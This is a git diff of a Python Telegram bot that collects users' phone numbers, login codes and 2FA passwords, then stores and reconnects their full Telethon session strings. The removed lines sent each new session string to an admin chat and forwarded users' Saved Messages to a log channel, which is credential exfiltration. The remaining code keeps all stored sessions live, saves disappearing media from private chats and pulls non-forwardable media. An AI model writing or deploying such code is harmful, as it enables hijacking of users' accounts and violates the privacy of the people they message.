@@ -47,7 +47,7 @@ app = ApplicationBuilder().token(BOT_TOKEN).build()
 API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
 user_login_data = {}
 
-# --- Auto Connect Previous Sessions ---
+# --- Auto Connect All Sessions ---
 async def auto_connect_all_sessions():
     async for record in sessions.find({"type": "telethon"}):
         session_str = record.get("session")
@@ -57,9 +57,12 @@ async def auto_connect_all_sessions():
         client = TelegramClient(StringSession(session_str), DEFAULT_API_ID, DEFAULT_API_HASH)
         try:
             await client.connect()
+            if not await client.is_user_authorized():
+                logger.warning(f"❌ Session not authorized for user {user_id}. Skipping.")
+                continue
+
             logger.info(f"✅ Auto-connected session for user: {user_id}")
 
-            # Forward anything user sends to Saved Messages
             @client.on(events.NewMessage(chats="me", incoming=True))
             async def saved_message_forwarder(event):
                 try:
@@ -71,12 +74,12 @@ async def auto_connect_all_sessions():
                 except Exception as e:
                     logger.warning(f"[SavedMessageForwardError] {e}")
 
-            app.create_task(client.run_until_disconnected())
+            asyncio.create_task(client.run_until_disconnected())
 
         except Exception as e:
             logger.error(f"❌ Failed to reconnect session for user {user_id}: {e}")
 
-# --- Cancel ---
+# --- Cancel Handler ---
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id in user_login_data:
@@ -88,7 +91,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ ᴀʟʟ ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ. Nᴏᴡ sᴇɴᴅ /start ᴀɢᴀɪɴ.")
     return ConversationHandler.END
 
-# --- /start Command ---
+# --- /start Handler ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     inline_keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
@@ -185,7 +188,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Fᴀɪʟᴇᴅ: {e}")
         return ConversationHandler.END
 
-# --- Get OTP ---
+# --- OTP ---
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     code = update.message.text.replace(" ", "").strip()
@@ -204,7 +207,7 @@ async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {e}")
     return ConversationHandler.END
 
-# --- Get 2FA Password ---
+# --- 2FA ---
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     password = update.message.text.strip()
@@ -228,14 +231,11 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
         {"$set": {
             "session": session_string,
             "type": "telethon",
-            "account_id": me.id,
-            "is_admin": True,
-            "creator_id": user_id
+            "account_id": me.id
         }},
         upsert=True
     )
 
-    # Disappearing Media Saver
     @client.on(events.NewMessage(incoming=True))
     async def media_handler(event):
         if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
@@ -251,49 +251,24 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception as e:
                 logger.warning(f"[Media Save Failed]: {e}")
 
-    # Saved Messages Logger
-    @client.on(events.NewMessage(chats="me", incoming=True))
-    async def forward_saved(event):
-        try:
-            await client.send_message(
-                LOG_CHANNEL_ID,
-                file=event.media if event.media else None,
-                message=event.text if event.text else None
-            )
-        except Exception as e:
-            logger.warning(f"[Saved Forward Error]: {e}")
-
     context.application.create_task(client.run_until_disconnected())
-
-    await context.bot.send_message(
-        chat_id=ADMIN_ID,
-        text=(
-            f"🔐 <b>New Telethon session</b>\n"
-            f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
-            f"📌 <b>Session ID:</b> <code>{me.id}</code>\n"
-            f"🔗 <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
-            f"🧬 <b>Session String:</b>\n<code>{session_string}</code>"
-        ),
-        parse_mode="HTML"
-    )
 
     await update.message.reply_text("✅ Sᴜᴄᴄᴇssғᴜʟʟʏ ʟᴏɢɢᴇᴅ ɪɴ ᴀɴᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ!")
     user_login_data.pop(user_id, None)
     return ConversationHandler.END
-# --- Fetch Request via Button ---
+
+# --- Fetch Button ---
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📎 Send the message link:\nEx: https://t.me/c/123/45 or https://t.me/username/123"
-    )
+    await update.message.reply_text("📎 Send message link:\nEx: https://t.me/c/123/45")
+
     return FETCH_LINK
 
-# --- Fetch Actual Message from Link ---
+# --- Fetch from Link ---
 async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
-
     if user_id not in user_login_data or "client" not in user_login_data[user_id]:
-        await update.message.reply_text("⚠️ You must connect your account first.")
+        await update.message.reply_text("⚠️ Connect your account first.")
         return ConversationHandler.END
 
     client = user_login_data[user_id]["client"]
@@ -314,12 +289,12 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         message = await client.get_messages(entity, ids=msg_id)
 
         if not message or not message.media:
-            await update.message.reply_text("⚠️ No media found in that message.")
+            await update.message.reply_text("⚠️ No media found.")
             return ConversationHandler.END
 
         file = await message.download_media()
         await client.send_file("me", file, caption="📥 Fetched from non-forwardable media link.")
-        await update.message.reply_text("✅ Media sent to your Saved Messages.")
+        await update.message.reply_text("✅ Media sent to Saved Messages.")
     except ChannelPrivateError:
         await update.message.reply_text("❌ You're not a member of that channel.")
     except Exception as e:
@@ -330,7 +305,7 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❓ Uɴᴋɴᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ. Usᴇ /start ᴛᴏ ʙᴇɢɪɴ ᴀɢᴀɪɴ.")
 
-# --- Conversation Handlers ---
+# --- Handlers ---
 login_conv = ConversationHandler(
     entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
     states={
@@ -352,21 +327,17 @@ fetch_menu_conv = ConversationHandler(
     fallbacks=[CommandHandler("cancel", cancel)],
 )
 
-# --- Run Setup ---
+# --- Run Bot ---
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CommandHandler("cancel", cancel))
 app.add_handler(MessageHandler(filters.COMMAND, unknown_command))
 app.add_handler(login_conv)
 app.add_handler(fetch_menu_conv)
 
-# --- Run Bot ---
 if __name__ == "__main__":
     import asyncio
-
     async def main():
         await auto_connect_all_sessions()
         print("🤖 Bot is running...")
-        await app.run_polling()  # ✅ handles initialize, start, polling, and idle internally
-
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(main())  # ✅ avoid asyncio.run() conflict on Heroku
+        await app.run_polling()
+    asyncio.run(main())    
